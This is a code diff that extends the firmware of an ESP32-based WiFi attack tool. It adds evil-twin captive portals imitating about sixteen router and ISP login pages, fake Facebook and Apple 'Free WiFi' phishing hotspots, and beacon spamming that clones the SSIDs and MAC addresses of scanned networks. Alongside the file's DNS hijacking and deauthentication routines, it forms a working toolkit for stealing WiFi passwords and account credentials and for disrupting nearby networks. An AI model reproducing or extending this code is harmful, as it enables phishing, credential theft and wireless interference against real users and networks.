@@ -45,8 +45,42 @@ extern const char html_google_start[] asm("_binary_google_html_start");
 extern const char html_google_end[]   asm("_binary_google_html_end");
 extern const char html_mcdonalds_start[] asm("_binary_mcdonalds_html_start");
 extern const char html_mcdonalds_end[]   asm("_binary_mcdonalds_html_end");
+extern const char html_facebook_start[] asm("_binary_facebook_html_start");
+extern const char html_facebook_end[]   asm("_binary_facebook_html_end");
+extern const char html_apple_start[] asm("_binary_apple_html_start");
+extern const char html_apple_end[]   asm("_binary_apple_html_end");
 extern const char html_router_start[] asm("_binary_router_html_start");
 extern const char html_router_end[]   asm("_binary_router_html_end");
+extern const char html_1_1_start[] asm("_binary_1_1_html_start");
+extern const char html_1_1_end[]   asm("_binary_1_1_html_end");
+extern const char html_a1_start[] asm("_binary_a1_html_start");
+extern const char html_a1_end[]   asm("_binary_a1_html_end");
+extern const char html_asus_start[] asm("_binary_asus_html_start");
+extern const char html_asus_end[]   asm("_binary_asus_html_end");
+extern const char html_att_start[] asm("_binary_att_html_start");
+extern const char html_att_end[]   asm("_binary_att_html_end");
+extern const char html_fritzbox_start[] asm("_binary_fritzbox_html_start");
+extern const char html_fritzbox_end[]   asm("_binary_fritzbox_html_end");
+extern const char html_globe_start[] asm("_binary_globe_html_start");
+extern const char html_globe_end[]   asm("_binary_globe_html_end");
+extern const char html_huawei_start[] asm("_binary_huawei_html_start");
+extern const char html_huawei_end[]   asm("_binary_huawei_html_end");
+extern const char html_magenta_start[] asm("_binary_magenta_html_start");
+extern const char html_magenta_end[]   asm("_binary_magenta_html_end");
+extern const char html_netgear_start[] asm("_binary_netgear_html_start");
+extern const char html_netgear_end[]   asm("_binary_netgear_html_end");
+extern const char html_o2_start[] asm("_binary_o2_html_start");
+extern const char html_o2_end[]   asm("_binary_o2_html_end");
+extern const char html_pldt_start[] asm("_binary_pldt_html_start");
+extern const char html_pldt_end[]   asm("_binary_pldt_html_end");
+extern const char html_swisscom_start[] asm("_binary_swisscom_html_start");
+extern const char html_swisscom_end[]   asm("_binary_swisscom_html_end");
+extern const char html_tplink_start[] asm("_binary_tplink_html_start");
+extern const char html_tplink_end[]   asm("_binary_tplink_html_end");
+extern const char html_verizon_start[] asm("_binary_verizon_html_start");
+extern const char html_verizon_end[]   asm("_binary_verizon_html_end");
+extern const char html_vodafone_start[] asm("_binary_vodafone_html_start");
+extern const char html_vodafone_end[]   asm("_binary_vodafone_html_end");
 
 
 //TODO: DO BITALIGNMENT and BITSHIFTING
@@ -68,13 +102,13 @@ uint8_t global_scans_count = 0;
 
 uint8_t channel;
 
+uint8_t beacon_ssid_index = 0;
+
 bool perform_active_scan = false;
 
 bool perform_passive_scan = false;
 
 bool scan_manually_stopped = false;
-
-uint32_t sequence_number = 0;
 
 wchar_t username1[22] = {0};
 wchar_t username2[22] = {0};
@@ -82,7 +116,13 @@ wchar_t username3[22] = {0};
 wchar_t username4[22] = {0};
 wchar_t password[64] = {0};
 
+char funny_ssids[24][32] = {"Two Girls One Router", "I'm Watching You", "Mom Use This One", "Martin Router King", "Never Gonna Give You Up", "VIRUS.EXE", "All Your Bandwidth Belong to Us", "Byte Me", "Never Gonna Give You Wifi", "The Password is...",
+                            "Girls Gone Wireless", "Vladimir Routin", "Try Me", "Definitely Not Wi-Fi", "Click and Die", "Connecting...", "Use at your own risk", "99 problems but Wi-Fi Aint One", "FreeVirus", "You are hacked!", "Next time lock your router",
+                            "For Porn Use Only", "You Pay Now", "I can read your emails"};
+
 captive_portal_task_args_t captive_portal_task_args;
+
+beacon_task_args_t beacon_task_args;
 
 #define DNS_PORT (53)
 #define DNS_MAX_LEN (256)
@@ -97,8 +137,7 @@ extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t a
 }
 
 // DNS Header Packet
-typedef struct __attribute__((__packed__))
-{
+typedef struct __attribute__((__packed__)) {
     uint16_t id;
     uint16_t flags;
     uint16_t qd_count;
@@ -114,8 +153,7 @@ typedef struct {
 } dns_question_t;
 
 // DNS Answer Packet
-typedef struct __attribute__((__packed__))
-{
+typedef struct __attribute__((__packed__)) {
     uint16_t ptr_offset;
     uint16_t type;
     uint16_t class;
@@ -135,7 +173,54 @@ int sock = 0;
 esp_err_t common_get_handler(httpd_req_t *req) {
     uint32_t len = 0;
     if (captive_portal_task_args.is_evil_twin) {
-       len = html_router_end - html_router_start;
+        if (captive_portal_task_args.cp_index == 0) {
+            len = html_router_end - html_router_start;
+        }
+        else if (captive_portal_task_args.cp_index == 1) {
+            len = html_huawei_end - html_huawei_start;
+        }
+        else if (captive_portal_task_args.cp_index == 2) {
+            len = html_asus_end - html_asus_start;
+        }
+        else if (captive_portal_task_args.cp_index == 3) {
+            len = html_tplink_end - html_tplink_start;
+        }
+        else if (captive_portal_task_args.cp_index == 4) {
+            len = html_netgear_end - html_netgear_start;
+        }
+        else if (captive_portal_task_args.cp_index == 5) {
+            len = html_o2_end - html_o2_start;
+        }
+        else if (captive_portal_task_args.cp_index == 6) {
+            len = html_fritzbox_end - html_fritzbox_start;
+        }
+        else if (captive_portal_task_args.cp_index == 7) {
+            len = html_vodafone_end - html_vodafone_start;
+        }
+        else if (captive_portal_task_args.cp_index == 8) {
+            len = html_magenta_end - html_magenta_start;
+        }
+        else if (captive_portal_task_args.cp_index == 9) {
+            len = html_1_1_end - html_1_1_start;
+        }
+        else if (captive_portal_task_args.cp_index == 10) {
+            len = html_a1_end - html_a1_start;
+        }
+        else if (captive_portal_task_args.cp_index == 11) {
+            len = html_globe_end - html_globe_start;
+        }
+        else if (captive_portal_task_args.cp_index == 12) {
+            len = html_pldt_end - html_pldt_start;
+        }
+        else if (captive_portal_task_args.cp_index == 13) {
+            len = html_att_end - html_att_start;
+        }
+        else if (captive_portal_task_args.cp_index == 14) {
+            len = html_swisscom_end - html_swisscom_start;
+        }
+        else if (captive_portal_task_args.cp_index == 15) {
+            len = html_verizon_end - html_verizon_start;
+        }
     }
     else {
        if (captive_portal_task_args.cp_index == 0) {
@@ -143,6 +228,12 @@ esp_err_t common_get_handler(httpd_req_t *req) {
        }
        else if (captive_portal_task_args.cp_index == 1) {
            len = html_mcdonalds_end - html_mcdonalds_start;
+       }
+       else if (captive_portal_task_args.cp_index == 2) {
+           len = html_facebook_end - html_facebook_start;
+       }
+       else if (captive_portal_task_args.cp_index == 3) {
+           len = html_apple_end - html_apple_start;
        }
     }
 
@@ -258,7 +349,54 @@ esp_err_t common_get_handler(httpd_req_t *req) {
     }
     httpd_resp_set_type(req, "text/html");
     if (captive_portal_task_args.is_evil_twin) {
-        httpd_resp_send(req, html_router_start, len);
+        if (captive_portal_task_args.cp_index == 0) { //TODO: add enums because nobody knows, and add more cps
+            httpd_resp_send(req, html_router_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 1) {
+            httpd_resp_send(req, html_huawei_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 2) {
+            httpd_resp_send(req, html_asus_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 3) {
+            httpd_resp_send(req, html_tplink_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 4) {
+            httpd_resp_send(req, html_netgear_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 5) {
+            httpd_resp_send(req, html_o2_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 6) {
+            httpd_resp_send(req, html_fritzbox_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 7) {
+            httpd_resp_send(req, html_vodafone_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 8) {
+            httpd_resp_send(req, html_magenta_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 9) {
+            httpd_resp_send(req, html_1_1_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 10) {
+            httpd_resp_send(req, html_a1_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 11) {
+            httpd_resp_send(req, html_globe_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 12) {
+            httpd_resp_send(req, html_pldt_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 13) {
+            httpd_resp_send(req, html_att_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 14) {
+            httpd_resp_send(req, html_swisscom_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 15) {
+            httpd_resp_send(req, html_verizon_start, len);
+        }
     }
     else {
         if (captive_portal_task_args.cp_index == 0) {
@@ -266,6 +404,12 @@ esp_err_t common_get_handler(httpd_req_t *req) {
         }
         else if (captive_portal_task_args.cp_index == 1) {
             httpd_resp_send(req, html_mcdonalds_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 2) {
+            httpd_resp_send(req, html_facebook_start, len);
+        }
+        else if (captive_portal_task_args.cp_index == 3) {
+            httpd_resp_send(req, html_apple_start, len);
         }
     }
     if (httpd_req_get_hdr_value_len(req, "Host") == 0) {
@@ -476,11 +620,6 @@ void htool_wifi_dns_start() {
     xTaskCreatePinnedToCore(dns_server_task, "dns_task", 4096, NULL, 5, NULL, 0);
 }
 
-void htool_wifi_start_httpd_server_task() {
-    ESP_LOGI(TAG, "Starting HTTP server ...");
-    xTaskCreatePinnedToCore(httpd_server_task, "http_server", 4096, NULL, 5, NULL, 0);
-}
-
 void wifi_event_handler(void* arg, esp_event_base_t event_base,
                         int32_t event_id, void* event_data) {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
@@ -513,9 +652,25 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
             wifi_config.ap.authmode = WIFI_AUTH_OPEN;
             wifi_config.ap.max_connection = 4;
         }
-        else {
+        else if (captive_portal_task_args.cp_index == 1) {
             ESP_LOGI(TAG, "Starting mcdonnalds captive portal ...");
             strcpy((char *)wifi_config.ap.ssid, "McDonald's Free WiFi");
+            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
+            wifi_config.ap.channel = 0;
+            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
+            wifi_config.ap.max_connection = 4;
+        }
+        else if (captive_portal_task_args.cp_index == 2) {
+            ESP_LOGI(TAG, "Starting facebook captive portal ...");
+            strcpy((char *)wifi_config.ap.ssid, "Facebook Free WiFi");
+            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
+            wifi_config.ap.channel = 0;
+            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
+            wifi_config.ap.max_connection = 4;
+        }
+        else if (captive_portal_task_args.cp_index == 3) {
+            ESP_LOGI(TAG, "Starting apple shop captive portal ...");
+            strcpy((char *)wifi_config.ap.ssid, "Apple Shop Free WiFi");
             wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
             wifi_config.ap.channel = 0;
             wifi_config.ap.authmode = WIFI_AUTH_OPEN;
@@ -528,7 +683,7 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
     cp_running = true;
     esp_wifi_start();
     htool_wifi_dns_start();
-    htool_wifi_start_httpd_server_task();
+    xTaskCreatePinnedToCore(httpd_server_task, "http_server", 4096, NULL, 5, NULL, 0);
 }
 
 void htool_wifi_captive_portal_stop(void *pvParameters) {
@@ -542,7 +697,7 @@ void htool_wifi_captive_portal_stop(void *pvParameters) {
 }
 
 // barebones packet
-uint8_t beacon_packet[56] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
+uint8_t beacon_packet[57] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
         /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address
         /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
         /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
@@ -564,11 +719,10 @@ static uint8_t deauth_packet[26] = {
 
 char beacon_random[] = "1234567890qwertzuiopasdfghjklyxcvbnm QWERTZUIOPASDFGHJKLYXCVBNM_";
 
-void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frames to make it looks more funny
+void send_random_beacon_frame() {
     channel = esp_random() % 13 + 1;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-    // Randomize SRC MAC
     beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
     beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
     beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
@@ -577,7 +731,6 @@ void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frame
     beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
     beacon_packet[37] = 6;
 
-    // Randomize SSID (Fixed size 6. Lazy right?)
     beacon_packet[38] = beacon_random[esp_random() % 65];
     beacon_packet[39] = beacon_random[esp_random() % 65];
     beacon_packet[40] = beacon_random[esp_random() % 65];
@@ -587,9 +740,8 @@ void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frame
 
     beacon_packet[56] = channel;
 
-    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                            0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
-
+    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+                            0x03, 0x01, 0x04 };
 
     for (uint8_t i = 0; i < 12; i++)
         beacon_packet[38 + 6 + i] = postSSID[i];
@@ -599,10 +751,123 @@ void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frame
     esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
 }
 
+void send_router_beacon_frame_random_mac(uint8_t ssid_index) {
+    esp_wifi_set_channel(global_scans[ssid_index].primary, global_scans[ssid_index].second);
+
+    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
+    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
+    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
+    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
+    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
+    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
+    beacon_packet[37] = strlen((const char*) global_scans[ssid_index].ssid);
+
+    for (uint8_t i = 0; i < beacon_packet[37]; i++)
+        beacon_packet[38 + i] = global_scans[ssid_index].ssid[i];
+
+    beacon_packet[56] = global_scans[ssid_index].primary;
+
+    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+                            0x03, 0x01, 0x04 };
+
+    for (uint8_t i = 0; i < 12; i++)
+        beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
+
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+}
+
+void send_router_beacon_frame_same_mac(uint8_t ssid_index) {
+    esp_wifi_set_channel(global_scans[ssid_index].primary, global_scans[ssid_index].second);
+
+    beacon_packet[10] = beacon_packet[16] = global_scans[ssid_index].bssid[0];
+    beacon_packet[11] = beacon_packet[17] = global_scans[ssid_index].bssid[1];
+    beacon_packet[12] = beacon_packet[18] = global_scans[ssid_index].bssid[2];
+    beacon_packet[13] = beacon_packet[19] = global_scans[ssid_index].bssid[3];
+    beacon_packet[14] = beacon_packet[20] = global_scans[ssid_index].bssid[4];
+    beacon_packet[15] = beacon_packet[21] = global_scans[ssid_index].bssid[5];
+    beacon_packet[37] = strlen((const char*) global_scans[ssid_index].ssid);
+
+    for (uint8_t i = 0; i < beacon_packet[37]; i++)
+        beacon_packet[38 + i] = global_scans[ssid_index].ssid[i];
+
+    beacon_packet[56] = global_scans[ssid_index].primary;
+
+    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+                            0x03, 0x01, 0x04 };
+
+    for (uint8_t i = 0; i < 12; i++)
+        beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
+
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+}
+
+void send_funny_beacon_frame() {
+    channel = esp_random() % 13 + 1;
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
+    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
+    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
+    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
+    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
+    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
+    beacon_ssid_index = esp_random() % 24;
+
+    beacon_packet[37] = strlen(funny_ssids[beacon_ssid_index]);
+
+    for (uint8_t i = 0; i < beacon_packet[37]; i++)
+        beacon_packet[38 + i] = funny_ssids[beacon_ssid_index][i];
+
+    beacon_packet[56] = global_scans[menu_cnt].primary;
+
+    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+                            0x03, 0x01, 0x04 };
+
+    for (uint8_t i = 0; i < 12; i++)
+        beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
+
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
+}
 
 void beacon_spammer() {
+    uint8_t ssid_index = 0;
     while (htool_api_is_beacon_spammer_running()) {
-        send_random_beacon_frame();
+        if (beacon_task_args.beacon_index == 0) {
+            send_random_beacon_frame();
+        }
+        else if (beacon_task_args.beacon_index == 1) {
+            if (menu_cnt == global_scans_count) {
+                ssid_index++;
+                if (ssid_index == global_scans_count) {
+                    ssid_index = 0;
+                }
+                send_router_beacon_frame_random_mac(menu_cnt);
+            }
+            else {
+                send_router_beacon_frame_random_mac(menu_cnt);
+            }
+        }
+        else if (beacon_task_args.beacon_index == 2) {
+            if (menu_cnt == global_scans_count) {
+                send_router_beacon_frame_same_mac(menu_cnt);
+                ssid_index++;
+                if (ssid_index == global_scans_count) {
+                    ssid_index = 0;
+                }
+            }
+            else {
+                send_router_beacon_frame_same_mac(menu_cnt);
+            }
+        }
+        else if (beacon_task_args.beacon_index == 3) {
+            send_funny_beacon_frame();
+        }
         ESP_LOGI(TAG, "Beacon sent");
         vTaskDelay(pdMS_TO_TICKS(10));
     }
@@ -621,7 +886,7 @@ void htool_wifi_start_beacon_spammer() {
 
 void htool_wifi_send_disassociate_frame(uint8_t num, bool sta) {
     if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
-        ESP_LOGI(TAG, "TARGET is connectiong");
+        ESP_LOGI(TAG, "TARGET is connecting");
         target_connected = true;
     }
 
